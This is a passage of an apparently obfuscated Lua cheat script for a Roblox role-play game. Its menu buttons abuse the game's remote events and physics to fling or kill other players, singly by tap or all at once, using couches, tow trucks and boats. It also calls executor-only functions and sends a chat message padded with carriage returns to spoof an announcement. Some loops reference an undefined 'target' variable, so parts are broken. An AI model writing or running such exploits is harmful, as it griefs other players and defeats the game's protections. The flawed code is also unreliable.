                "PickingTools",
                "Couch"
            }
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(vu876))
            task.wait(0.3)
            local v877 = vu628.Backpack:FindFirstChild("Couch")
            if v877 then
                v877.Parent = vu873
            end
            task.wait(0.2)
            game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F, false, game)
            task.wait(0.25)
            workspace.FallenPartsDestroyHeight = 0 / 0
            local vu878 = Instance.new("BodyVelocity")
            vu878.Name = "FlingForce"
            vu878.Velocity = Vector3.new(900000000, 900000000, 900000000)
            vu878.MaxForce = Vector3.new(1 / 0, 1 / 0, 1 / 0)
            vu878.Parent = vu871
            vu874:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
            vu874.PlatformStand = false
            vu629.CameraSubject = vu870.Character:FindFirstChild("Head") or (v872 or vu874)
            task.spawn(function()
                local v879 = {
                    vu871
                }
                local v880 = 0
                while vu630 and (vu870 and vu870.Character) and (vu870.Character:FindFirstChildOfClass("Humanoid") and not vu870.Character:FindFirstChildOfClass("Humanoid").Sit) do
                    v880 = v880 + 50
                    local v881, v882, v883 = ipairs(v879)
                    while true do
                        local v884
                        v883, v884 = v881(v882, v883)
                        if v883 == nil then
                            break
                        end
                        local v885 = vu870.Character.HumanoidRootPart.Position.X
                        local v886 = vu870.Character.HumanoidRootPart.Position.Y
                        local v887 = vu870.Character.HumanoidRootPart.Position.Z
                        local v888 = v885 + vu870.Character.HumanoidRootPart.Velocity.X / 1.5
                        local v889 = v886 + vu870.Character.HumanoidRootPart.Velocity.Y / 1.5
                        local v890 = v887 + vu870.Character.HumanoidRootPart.Velocity.Z / 1.5
                        vu871.CFrame = CFrame.new(v888, v889, v890) * CFrame.Angles(math.rad(v880), 0, 0)
                    end
                    vu871.Velocity = Vector3.new(900000000, 900000000, 900000000)
                    vu871.RotVelocity = Vector3.new(900000000, 900000000, 900000000)
                    task.wait()
                end
                vu630 = false
                vu878:Destroy()
                vu874:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                vu874.PlatformStand = false
                vu871.CFrame = vu875
                vu629.CameraSubject = vu874
                local v891 = vu873
                local v892, v893, v894 = pairs(v891:GetDescendants())
                while true do
                    local v895
                    v894, v895 = v892(v893, v894)
                    if v894 == nil then
                        break
                    end
                    if v895:IsA("BasePart") then
                        v895.Velocity = Vector3.zero
                        v895.RotVelocity = Vector3.zero
                    end
                end
                vu874:UnequipTools()
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(vu876))
            end)
        end
    end
})
Tab10:AddSection({
    Name = "Click Kill Methods"
})
Tab10:AddButton({
    Name = "Click Fling Couch (Tool)",
    Callback = function()
        local vu960 = game:GetService("Players")
        local vu961 = game:GetService("ReplicatedStorage")
        local v962 = game:GetService("UserInputService")
        local vu963 = vu960.LocalPlayer
        local vu964 = workspace.CurrentCamera
        local vu965 = true
        local vu966 = false
        local v967 = "Click Fling Couch"
        local v968 = vu963:WaitForChild("Backpack")
        if not (v968:FindFirstChild(v967) or vu963.Character and vu963.Character:FindFirstChild(v967)) then
            local v969 = Instance.new("Tool")
            v969.Name = v967
            v969.RequiresHandle = false
            v969.CanBeDropped = false
            v969.Equipped:Connect(function()
                vu966 = true
            end)
            v969.Unequipped:Connect(function()
                vu966 = false
            end)
            v969.Parent = v968
        end
        local function vu992(pu970)
            if vu966 then
                if pu970 and (pu970.Character and pu970 ~= vu963) then
                    local vu971 = true
                    local vu972 = vu963.Character
                    if vu972 then
                        vu972 = vu963.Character:FindFirstChild("HumanoidRootPart")
                    end
                    local v973 = pu970.Character
                    if v973 then
                        v973 = pu970.Character:FindFirstChild("HumanoidRootPart")
                    end
                    if vu972 and v973 then
                        local vu974 = vu963.Character
                        local vu975 = vu974:FindFirstChildOfClass("Humanoid")
                        local vu976 = vu972.CFrame
                        vu961:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
                        task.wait(0.2)
                        vu961.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
                        task.wait(0.3)
                        local v977 = vu963.Backpack:FindFirstChild("Couch")
                        if v977 then
                            v977.Parent = vu974
                        end
                        task.wait(0.1)
                        game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F, false, game)
                        task.wait(0.25)
                        workspace.FallenPartsDestroyHeight = 0 / 0
                        local vu978 = Instance.new("BodyVelocity")
                        vu978.Name = "ForcaJogada"
                        vu978.Velocity = Vector3.new(900000000, 900000000, 900000000)
                        vu978.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                        vu978.Parent = vu972
                        vu975:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
                        vu975.PlatformStand = false
                        vu964.CameraSubject = pu970.Character:FindFirstChild("Head") or (v973 or vu975)
                        task.spawn(function()
                            local v979 = {
                                vu972
                            }
                            local v980 = 0
                            while vu971 and (pu970 and pu970.Character) and (pu970.Character:FindFirstChildOfClass("Humanoid") and not pu970.Character:FindFirstChildOfClass("Humanoid").Sit) do
                                v980 = v980 + 50
                                local v981, v982, v983 = ipairs(v979)
                                while true do
                                    local v984
                                    v983, v984 = v981(v982, v983)
                                    if v983 == nil then
                                        break
                                    end
                                    local v985 = pu970.Character.HumanoidRootPart
                                    local v986 = v985.Position + v985.Velocity / 1.5
                                    vu972.CFrame = CFrame.new(v986) * CFrame.Angles(math.rad(v980), 0, 0)
                                end
                                vu972.Velocity = Vector3.new(900000000, 900000000, 900000000)
                                vu972.RotVelocity = Vector3.new(900000000, 900000000, 900000000)
                                task.wait()
                            end
                            vu971 = false
                            vu978:Destroy()
                            vu975:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                            vu975.PlatformStand = false
                            vu972.CFrame = vu976
                            vu964.CameraSubject = vu975
                            local v987 = vu974
                            local v988, v989, v990 = pairs(v987:GetDescendants())
                            while true do
                                local v991
                                v990, v991 = v988(v989, v990)
                                if v990 == nil then
                                    break
                                end
                                if v991:IsA("BasePart") then
                                    v991.Velocity = Vector3.zero
                                    v991.RotVelocity = Vector3.zero
                                end
                            end
                            vu975:UnequipTools()
                            vu961.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
                        end)
                        while vu971 do
                            task.wait()
                        end
                    end
                else
                    return
                end
            else
                return
            end
        end
        v962.TouchTap:Connect(function(p993, p994)
            if not p994 and (vu965 and vu966) then
                local v995 = p993[1]
                local v996 = vu964:ScreenPointToRay(v995.X, v995.Y)
                local v997 = workspace:Raycast(v996.Origin, v996.Direction * 1000)
                if v997 and v997.Instance then
                    local v998 = vu960:GetPlayerFromCharacter(v997.Instance:FindFirstAncestorOfClass("Model"))
                    if v998 and v998 ~= vu963 then
                        vu965 = false
                        vu992(v998)
                        task.delay(2, function()
                            vu965 = true
                        end)
                    end
                end
            end
        end)
    end
})
Tab10:AddButton({
    Name = "Click Kill Couch (Tool)",
    Callback = function()
        local vu1060 = game:GetService("Players")
        local vu1061 = game:GetService("ReplicatedStorage")
        local vu1062 = game:GetService("RunService")
        local vu1063 = game:GetService("Workspace")
        local v1064 = game:GetService("UserInputService")
        local vu1065 = vu1060.LocalPlayer
        local vu1066 = vu1063.CurrentCamera
        local v1067 = "Click Kill Couch"
        local vu1068 = false
        local vu1069 = nil
        local vu1070 = nil
        local vu1071 = false
        local vu1072 = nil
        local vu1073 = nil
        local vu1074 = nil
        local v1075 = vu1065:WaitForChild("Backpack")
        if not v1075:FindFirstChild(v1067) then
            local v1076 = Instance.new("Tool")
            v1076.Name = v1067
            v1076.RequiresHandle = false
            v1076.CanBeDropped = false
            v1076.Equipped:Connect(function()
                vu1068 = true
            end)
            v1076.Unequipped:Connect(function()
                vu1068 = false
                vu1069 = nil
                limparSofa()
            end)
            v1076.Parent = v1075
        end
        function limparSofa()
            if vu1070 then
                vu1070:Disconnect()
                vu1070 = nil
            end
            if vu1071 then
                local v1077 = vu1065.Character
                local v1078 = v1077 and v1077:FindFirstChild("Couch")
                if v1078 then
                    v1078.Parent = vu1065.Backpack
                    vu1071 = false
                end
            end
            if vu1072 then
                vu1072:Destroy()
                vu1072 = nil
            end
            if getgenv().AntiSit then
                getgenv().AntiSit:Set(false)
            end
            local v1079 = vu1065.Character
            if v1079 then
                v1079 = vu1065.Character:FindFirstChildOfClass("Humanoid")
            end
            if v1079 then
                v1079:SetStateEnabled(Enum.HumanoidStateType.Physics, true)
                v1079:ChangeState(Enum.HumanoidStateType.GettingUp)
            end
            if vu1073 and vu1074 then
                vu1074.CFrame = vu1073
                vu1073 = nil
            end
        end
        function pegarSofa()
            local v1080 = vu1065.Character
            if v1080 then
                local v1081 = vu1065.Backpack
                if not (v1081:FindFirstChild("Couch") or v1080:FindFirstChild("Couch")) then
                    vu1061.RE["1Too1l"]:InvokeServer(unpack({
                        "PickingTools",
                        "Couch"
                    }))
                    task.wait(0.1)
                end
                local v1082 = v1081:FindFirstChild("Couch") or v1080:FindFirstChild("Couch")
                if v1082 then
                    v1082.Parent = v1080
                    vu1071 = true
                end
            end
        end
        function posAleatoriaAbaixo(p1083)
            local v1084 = p1083:FindFirstChild("HumanoidRootPart")
            if not v1084 then
                return Vector3.new()
            end
            local v1085 = Vector3.new(math.random(- 2, 2), - 5.1, math.random(- 2, 2))
            return v1084.Position + v1085
        end
        function tpAbaixo(p1086)
            if p1086 and p1086.Character and p1086.Character:FindFirstChild("HumanoidRootPart") then
                local v1087 = vu1065.Character
                local v1088
                if v1087 then
                    v1088 = v1087:FindFirstChild("HumanoidRootPart")
                else
                    v1088 = v1087
                end
                if v1087 then
                    v1087 = v1087:FindFirstChildOfClass("Humanoid")
                end
                if v1088 and v1087 then
                    v1087:SetStateEnabled(Enum.HumanoidStateType.Physics, false)
                    if not vu1072 then
                        vu1072 = Instance.new("Part")
                        vu1072.Size = Vector3.new(10, 1, 10)
                        vu1072.Anchored = true
                        vu1072.CanCollide = true
                        vu1072.Transparency = 0.5
                        vu1072.Parent = vu1063
                    end
                    local v1089 = posAleatoriaAbaixo(p1086.Character)
                    vu1072.Position = v1089
                    v1088.CFrame = CFrame.new(v1089)
                    v1087:SetStateEnabled(Enum.HumanoidStateType.Physics, true)
                end
            else
                return
            end
        end
        function arremessarComSofa(p1090)
            if p1090 then
                vu1069 = p1090.Name
                local v1091 = vu1065.Character
                if v1091 then
                    local v1092 = v1091:FindFirstChild("HumanoidRootPart")
                    if v1092 then
                        v1092 = v1091.HumanoidRootPart.CFrame
                    end
                    vu1073 = v1092
                    vu1074 = v1091:FindFirstChild("HumanoidRootPart")
                    pegarSofa()
                    vu1070 = vu1062.Heartbeat:Connect(function()
                        local v1093 = vu1060:FindFirstChild(vu1069)
                        if v1093 and v1093.Character and v1093.Character:FindFirstChild("Humanoid") then
                            if getgenv().AntiSit then
                                getgenv().AntiSit:Set(true)
                            end
                            tpAbaixo(v1093)
                        else
                            limparSofa()
                        end
                    end)
                    task.spawn(function()
                        local v1094 = vu1060:FindFirstChild(vu1069)
                        while v1094 and v1094.Character and v1094.Character:FindFirstChild("Humanoid") do
                            task.wait(0.05)
                            if v1094.Character.Humanoid.SeatPart then
                                local v1095 = CFrame.new(265.46, - 450.83, - 59.93)
                                v1094.Character.HumanoidRootPart.CFrame = v1095
                                vu1065.Character.HumanoidRootPart.CFrame = v1095
                                task.wait(0.4)
                                limparSofa()
                                task.wait(0.2)
                                if vu1073 then
                                    vu1065.Character.HumanoidRootPart.CFrame = vu1073
                                end
                                break
                            end
                        end
                    end)
                end
            else
                return
            end
        end
        v1064.TouchTap:Connect(function(p1096, p1097)
            if vu1068 and not p1097 then
                local v1098 = p1096[1]
                local v1099 = vu1066:ScreenPointToRay(v1098.X, v1098.Y)
                local v1100 = vu1063:Raycast(v1099.Origin, v1099.Direction * 1000)
                if v1100 and v1100.Instance then
                    local v1101 = vu1060:GetPlayerFromCharacter((v1100.Instance:FindFirstAncestorOfClass("Model")))
                    if v1101 and v1101 ~= vu1065 then
                        arremessarComSofa(v1101)
                    end
                end
            end
        end)
    end
})
Tab10:AddSection({
    Name = "All methods"
})
Tab10:AddButton({
    Name = "Fling All Truck",
    Callback = function()
        local vu1102 = game:GetService("Players")
        local v1103 = game:GetService("RunService")
        local v1104, v1105, v1106 = pairs(vu1102:GetPlayers())
        while true do
            local v1107
            v1106, v1107 = v1104(v1105, v1106)
            if v1106 == nil then
                return
            end
            local v1108 = vu1102.LocalPlayer.Character or vu1102.LocalPlayer.CharacterAdded:Wait()
            v1108:WaitForChild("HumanoidRootPart")
            if table.find(Whitelist, target.Name) == nil then
                local v1109 = v1108:GetPivot()
                v1108:PivotTo(CFrame.new(1109.56591796875, 93.420654296875, - 1236.69580078125))
                task.wait(0.5)
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack({
                    "PickingCar",
                    "TowTruck"
                }))
                task.wait(0.5)
                v1108:PivotTo(v1109)
                local v1110 = v1107.Name
                local function v1118(p1111)
                    local v1112 = p1111:lower()
                    local v1113 = vu1102
                    local v1114, v1115, v1116 = ipairs(v1113:GetPlayers())
                    while true do
                        local v1117
                        v1116, v1117 = v1114(v1115, v1116)
                        if v1116 == nil then
                            break
                        end
                        if v1117 ~= vu1102.LocalPlayer and v1117.Name:lower():sub(1, # v1112) == v1112 then
                            return v1117
                        end
                    end
                    return nil
                end
                local v1119
                if v1110 == "" then
                    v1119 = false
                else
                    v1119 = v1118(v1110)
                end
                if not v1119 then
                    local v1120, v1121, v1122 = ipairs(vu1102:GetPlayers())
                    local v1123 = {}
                    while true do
                        local v1124
                        v1122, v1124 = v1120(v1121, v1122)
                        if v1122 == nil then
                            break
                        end
                        if v1124 ~= vu1102.LocalPlayer then
                            table.insert(v1123, v1124)
                        end
                    end
                    v1119 = # v1123 > 0 and v1123[math.random(1, # v1123)]
                    if not v1119 then
                        v1119 = nil
                    end
                end
                if not (v1119 and v1119.Character and v1119.Character:FindFirstChild("HumanoidRootPart")) then
                    warn("Invalid target")
                    return
                end
                local v1125 = v1119.Character.HumanoidRootPart
                workspace.CurrentCamera.CameraSubject = v1119.Character:FindFirstChild("Humanoid")
                local v1126 = workspace:FindFirstChild("Vehicles")
                if v1126 then
                    v1126 = v1126:FindFirstChild(vu1102.LocalPlayer.Name .. "Car")
                end
                if v1126 then
                    v1126 = v1126:FindFirstChild("Body")
                end
                if v1126 then
                    v1126 = v1126:FindFirstChild("BodyPanels")
                end
                if v1126 then
                    v1126 = v1126:FindFirstChild("ModelMove2")
                end
                if not v1126 then
                    warn("ModelMove2 not found.")
                    return
                end
                local v1127, v1128, v1129 = ipairs(v1126:GetDescendants())
                local v1130 = {}
                while true do
                    local v1131
                    v1129, v1131 = v1127(v1128, v1129)
                    if v1129 == nil then
                        break
                    end
                    if v1131:IsA("BasePart") and (v1131.Size.Magnitude > 5 and (not v1131.Anchored and v1131.CanCollide)) then
                        v1131.Anchored = false
                        v1131.CanCollide = true
                        local v1132, v1133, v1134 = ipairs(v1131:GetChildren())
                        while true do
                            local v1135
                            v1134, v1135 = v1132(v1133, v1134)
                            if v1134 == nil then
                                break
                            end
                            if v1135:IsA("BodyVelocity") or v1135:IsA("BodyAngularVelocity") then
                                v1135:Destroy()
                            end
                        end
                        local v1136 = Instance.new("BodyVelocity")
                        v1136.MaxForce = Vector3.new(90000000000, 90000000000, 90000000000)
                        v1136.P = 90000000000
                        v1136.Velocity = Vector3.new()
                        v1136.Parent = v1131
                        local v1137 = Instance.new("BodyAngularVelocity")
                        v1137.MaxTorque = Vector3.new(900000000, 900000000, 900000000)
                        v1137.AngularVelocity = Vector3.new()
                        v1137.Parent = v1131
                        table.insert(v1130, {
                            part = v1131,
                            bv = v1136,
                            bav = v1137
                        })
                    end
                end
                if # v1130 == 0 then
                    warn("No valid part for fling.")
                    return
                end
                local v1138 = os.time()
                local v1139 = 10000
                local v1140 = 25000
                local v1141 = 3750
                local v1142 = 1.5
                local function v1146(p1143, p1144, p1145)
                    return math.sin(p1143 * p1144) * p1145
                end
                while true do
                    local v1147 = tick()
                    local v1148 = v1125.Position
                    local v1149, v1150, v1151 = ipairs(v1130)
                    while true do
                        local v1152
                        v1151, v1152 = v1149(v1150, v1151)
                        if v1151 == nil then
                            break
                        end
                        local v1153 = v1152.part
                        local v1154 = v1152.bv
                        local v1155 = v1152.bav
                        local v1156 = v1147 * v1141 + v1151 * (2 * math.pi / # v1130)
                        local v1157 = v1148 + Vector3.new(math.cos(v1156) * v1142 + v1146(v1147 + v1151, 15, 0.5), math.sin(v1147 * v1141 * 0.8 + v1151) * 3 + v1146(v1147 * 10 + v1151, 20, 0.3), math.sin(v1156) * v1142 + v1146(v1147 + v1151 * 2, 12, 0.5))
                        local v1158 = v1157 - v1153.Position
                        local v1159 = v1158.Magnitude
                        local v1160 = math.clamp(v1159 * 150 + v1146(v1147 * 25 + v1151, 40, 100), 0, v1139)
                        v1154.Velocity = v1158.Unit * v1160
                        v1155.AngularVelocity = Vector3.new(math.sin(v1147 * 60 + v1151) * v1140, math.cos(v1147 * 90 + v1151) * v1140, math.sin(v1147 * 100 + v1151) * v1140)
                        v1153.CFrame = CFrame.new(v1157) * CFrame.Angles(math.sin(v1147 * 20 + v1151) * math.pi / 3, math.cos(v1147 * 15 + v1151) * math.pi / 3, math.sin(v1147 * 10 + v1151) * math.pi / 3)
                    end
                    v1103.Heartbeat:Wait()
                    if os.time() - v1138 >= 5 or v1125.Velocity.Magnitude >= 300 then
                    end
                end
            end
        end
    end
})
print("Kill All Truck button created")
Tab10:AddButton({
    Name = "Fling Boat all",
    Callback = function()
        local v1161 = game.Players.LocalPlayer
        local v1162 = v1161.Character
        local v1163 = v1162:FindFirstChildOfClass("Humanoid")
        local v1164 = v1162:FindFirstChild("HumanoidRootPart")
        local v1165 = game.Workspace:FindFirstChild("Vehicles")
        local v1166 = v1164.CFrame
        local vu1167 = 0
        if not v1165:FindFirstChild(v1161.Name .. "Car") and v1164 then
            v1164.CFrame = CFrame.new(1754, - 2, 58)
            task.wait(0.5)
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")
            task.wait(0.5)
            local v1168 = v1165:FindFirstChild(v1161.Name .. "Car")
            task.wait(0.5)
            local v1169 = v1168:FindFirstChild("Body")
            if v1169 then
                v1169 = v1168.Body:FindFirstChild("VehicleSeat")
            end
            if v1169 then
                repeat
                    task.wait()
                    v1164.CFrame = v1169.CFrame * CFrame.new(0, math.random(- 1, 1), 0)
                until v1163.Sit
            end
        end
        task.wait(0.5)
        local vu1170 = v1165:FindFirstChild(v1161.Name .. "Car")
        if vu1170 and not v1163.Sit then
            local v1171 = vu1170:FindFirstChild("Body")
            if v1171 then
                v1171 = vu1170.Body:FindFirstChild("VehicleSeat")
            end
            if v1171 then
                repeat
                    task.wait()
                    v1164.CFrame = v1171.CFrame * CFrame.new(0, math.random(- 1, 1), 0)
                until v1163.Sit
            end
        end
        local v1172 = Instance.new("BodyGyro")
        v1172.Parent = vu1170.PrimaryPart
        v1172.MaxTorque = Vector3.new(10000000, 10000000, 10000000)
        v1172.P = 10000000
        v1172.CFrame = vu1170.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(90), 0)
        local function v1179(_, p1173, _)
            vu1167 = 0
            local v1174 = tick() + 1
            while tick() < v1174 do
                vu1167 = vu1167 + 100
                task.wait()
                local function v1178(p1175, p1176, p1177)
                    vu1170:SetPrimaryPartCFrame(CFrame.new(p1175.Position) * p1176 * p1177)
                end
                v1178(p1173, CFrame.new(0, 3, 0), CFrame.Angles(math.rad(vu1167), 0, 0))
                v1178(p1173, CFrame.new(0, - 1.5, 2), CFrame.Angles(math.rad(vu1167), 0, 0))
                v1178(p1173, CFrame.new(2, 1.5, 2.25), CFrame.Angles(math.rad(50), 0, 0))
                v1178(p1173, CFrame.new(- 2.25, - 1.5, 2.25), CFrame.Angles(math.rad(30), 0, 0))
                v1178(p1173, CFrame.new(0, 1.5, 0), CFrame.Angles(math.rad(vu1167), 0, 0))
                v1178(p1173, CFrame.new(0, - 1.5, 0), CFrame.Angles(math.rad(vu1167), 0, 0))
            end
        end
        local v1180, v1181, v1182 = pairs(game.Players:GetPlayers())
        while true do
            local v1183
            v1182, v1183 = v1180(v1181, v1182)
            if v1182 == nil then
                break
            end
            if v1183 ~= v1161 or table.find(Whitelist, target.Name) == nil then
                local v1184 = v1183.Character
                local v1185
                if v1184 then
                    v1185 = v1184:FindFirstChildOfClass("Humanoid")
                else
                    v1185 = v1184
                end
                local v1186
                if v1184 then
                    v1186 = v1184:FindFirstChild("HumanoidRootPart")
                else
                    v1186 = v1184
                end
                if v1184 and (v1185 and v1186) then
                    v1179(v1184, v1186, v1185)
                end
            end
        end
        task.wait(0.5)
        vu1170:SetPrimaryPartCFrame(CFrame.new(0, 0, 0))
        task.wait(0.5)
        v1163.Sit = false
        task.wait(0.5)
        v1164.CFrame = v1166
        v1172:Destroy()
    end
})
print("Fling Boat All button created")
Tab10:AddButton({
    Name = "Auto Fling All",
    Callback = function()
        local v1187 = game:GetService("Players")
        local vu1188 = game:GetService("ReplicatedStorage")
        local vu1189 = v1187.LocalPlayer
        local vu1190 = workspace.CurrentCamera
        local function v1213(pu1191)
            if pu1191 and (pu1191.Character and (pu1191 ~= vu1189 and table.find(Whitelist, pu1191.Name) == nil)) then
                local vu1192 = true
                local vu1193 = vu1189.Character
                if vu1193 then
                    vu1193 = vu1189.Character:FindFirstChild("HumanoidRootPart")
                end
                local v1194 = pu1191.Character
                if v1194 then
                    v1194 = pu1191.Character:FindFirstChild("HumanoidRootPart")
                end
                if vu1193 and v1194 then
                    local vu1195 = vu1189.Character
                    local vu1196 = vu1195:FindFirstChildOfClass("Humanoid")
                    local vu1197 = vu1193.CFrame
                    vu1188:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
                    task.wait(0.2)
                    vu1188.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
                    task.wait(0.3)
                    local v1198 = vu1189.Backpack:FindFirstChild("Couch")
                    if v1198 then
                        v1198.Parent = vu1195
                    end
                    task.wait(0.1)
                    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F, false, game)
                    task.wait(0.25)
                    workspace.FallenPartsDestroyHeight = 0 / 0
                    local vu1199 = Instance.new("BodyVelocity")
                    vu1199.Name = "FlingForce"
                    vu1199.Velocity = Vector3.new(900000000, 900000000, 900000000)
                    vu1199.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                    vu1199.Parent = vu1193
                    vu1196:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
                    vu1196.PlatformStand = false
                    vu1190.CameraSubject = pu1191.Character:FindFirstChild("Head") or (v1194 or vu1196)
                    task.spawn(function()
                        local v1200 = {
                            vu1193
                        }
                        local v1201 = 0
                        while vu1192 and (pu1191 and pu1191.Character) and (pu1191.Character:FindFirstChildOfClass("Humanoid") and not pu1191.Character:FindFirstChildOfClass("Humanoid").Sit) do
                            v1201 = v1201 + 50
                            local v1202, v1203, v1204 = ipairs(v1200)
                            while true do
                                local v1205
                                v1204, v1205 = v1202(v1203, v1204)
                                if v1204 == nil then
                                    break
                                end
                                local v1206 = pu1191.Character.HumanoidRootPart
                                local v1207 = v1206.Position + v1206.Velocity / 1.5
                                vu1193.CFrame = CFrame.new(v1207) * CFrame.Angles(math.rad(v1201), 0, 0)
                            end
                            vu1193.Velocity = Vector3.new(900000000, 900000000, 900000000)
                            vu1193.RotVelocity = Vector3.new(900000000, 900000000, 900000000)
                            task.wait()
                        end
                        vu1192 = false
                        vu1199:Destroy()
                        vu1196:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                        vu1196.PlatformStand = false
                        vu1193.CFrame = vu1197
                        vu1190.CameraSubject = vu1196
                        local v1208 = vu1195
                        local v1209, v1210, v1211 = pairs(v1208:GetDescendants())
                        while true do
                            local v1212
                            v1211, v1212 = v1209(v1210, v1211)
                            if v1211 == nil then
                                break
                            end
                            if v1212:IsA("BasePart") then
                                v1212.Velocity = Vector3.zero
                                v1212.RotVelocity = Vector3.zero
                            end
                        end
                        vu1196:UnequipTools()
                        vu1188.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
                    end)
                    while vu1192 do
                        task.wait()
                    end
                end
            else
                return
            end
        end
        local v1214, v1215, v1216 = ipairs(v1187:GetPlayers())
        while true do
            local v1217
            v1216, v1217 = v1214(v1215, v1216)
            if v1216 == nil then
                break
            end
            v1213(v1217)
        end
    end
})
print("Kill All Couch button created")
---------------------------------------------------------------------------------------------------------------------------------
                                                   -- === Tab 10: Trolling Map === --
---------------------------------------------------------------------------------------------------------------------------------
local Section = Tab11:Section({ Title = "Trolling Map", Icon = "map-pin" })

Tab11:AddParagraph({ "Warn", "This is not visual, it applies directly to the shirt you are wearing" })

Tab11:AddSection({ "SkyBox By Bruton" })

Tab11:AddButton({

    Name = "SkyBox [ by BRUTON HUB]",

    Callback = function()

        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local LocalPlayer = Players.LocalPlayer

        local Remotes = ReplicatedStorage:WaitForChild("Remotes")
        local WearRemote = Remotes:WaitForChild("Wear")
        local ChangeCharacterBody = Remotes:WaitForChild("ChangeCharacterBody")
        local WearShirtRemote = Remotes:WaitForChild("WearShirt")

        local CurrentTrack
        local BodyId = "100839513065432"
        local SkyboxActive = false
        local Humanoid, Animator

        local function SetupCharacter(char)
            Humanoid = char:WaitForChild("Humanoid")
            Animator = Humanoid:FindFirstChildOfClass("Animator")
            if not Animator then
                Animator = Instance.new("Animator", Humanoid)
            end
        end
        
        SetupCharacter(LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait())
        LocalPlayer.CharacterAdded:Connect(SetupCharacter)
        local function ApplyAccessories()
        
            local Desc = Humanoid:GetAppliedDescription()
            for _, accessory in ipairs(Desc:GetAccessories(true)) do
                if accessory.AssetId then
                    pcall(function()
                        WearRemote:InvokeServer(accessory.AssetId)
                    end)
                end
            end
        end


        local function ApplyBody()
            pcall(function()
                ChangeCharacterBody:InvokeServer({
                    [1] = tonumber(BodyId),
                    [2] = nil,
                    [3] = nil,
                    [4] = nil,
                    [5] = nil,
                    [6] = nil
                })
            end)
        end

       local function PlayAnimation()
            local AnimId = "rbxassetid://101852027997337"
            local newAnim = Instance.new("Animation")
            newAnim.AnimationId = AnimId


            local newTrack
            pcall(function()
                newTrack = Animator:LoadAnimation(newAnim)
                newTrack.Priority = Enum.AnimationPriority.Action4
                newTrack:Play(0.1, 1, 1)
            end)

            CurrentTrack = newTrack
        end

        local function StopAnimation()
            if CurrentTrack then
                pcall(function()
                    CurrentTrack:Stop(0)
                end)
            end
        end

        SkyboxActive = not SkyboxActive
        if SkyboxActive then
            local id = tonumber(getgenv().SkyboxClothID or "")
            if id then
                pcall(function()
                    WearShirtRemote:InvokeServer(id)
                end)
            end
            ApplyAccessories()
            ApplyBody()
            PlayAnimation()
            print("Skybox activated with clothes")
        else
            StopAnimation()
            print("Skybox stopped")
        end
    end
})



Tab11:AddButton({

   Name = "Remove Skybox ( Reset your Skin )",

   Callback = function()

local Remote = game:GetService("ReplicatedStorage").Remotes.ResetCharacterAppearance

firesignal(Remote.OnClientEvent)



game:GetService("ReplicatedStorage").Remotes.ResetCharacterAppearance:FireServer()



task.wait(0.5)



local player = game.Players.LocalPlayer

if player.Character and player.Character:FindFirstChild("Humanoid") then

player.Character.Humanoid.Health = 0

end

end

})



Tab11:AddParagraph({ "Warn", "This is not visual, it applies directly to the shirt you are wearing" })

Tab11:AddSection({ "Natural Disasters" })

Tab11:AddButton({

    Name = "[OP] Tornado - Pirate Ship (Large)",

    Callback = function()

local RS = game:GetService("ReplicatedStorage")

local RunService = game:GetService("RunService")

local TextChatService = game:GetService("TextChatService")

local Player = game.Players.LocalPlayer

local Character = Player.Character or Player.CharacterAdded:Wait()

local Humanoid = Character:WaitForChild("Humanoid")

local RootPart = Character:WaitForChild("HumanoidRootPart")

local Vehicles = workspace:WaitForChild("Vehicles")



if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then 

    TextChatService.TextChannels.RBXGeneral:SendAsync(

        "hi\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\rTornado has appeared! Be careful..."

    )

else 

end



local selectedAudioID = 9068077052

local function playAudio()

    if not selectedAudioID then

        return

    end



    local args = {

        [1] = workspace,

        [2] = selectedAudioID,

        [3] = 1,

    }



    for i = 1, 5 do

        RS.RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))



        local sound = Instance.new("Sound")

        sound.SoundId = "rbxassetid://" .. tostring(selectedAudioID)

        sound.Parent = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")

        if sound.Parent then

            sound:Play()

        else

            break

        end



        task.wait(1.5)

        sound:Destroy()

    end

end



local function spawnBoat()

    RootPart.CFrame = CFrame.new(1754, -2, 58)

    task.wait(0.5)

    RS:WaitForChild("RE"):FindFirstChild("1Ca1r"):FireServer("PickingBoat", "PirateFree")

    task.wait(1)

    return Vehicles:FindFirstChild(Player.Name .. "Car")

end



local PCar = spawnBoat()

if not PCar then

    return

end



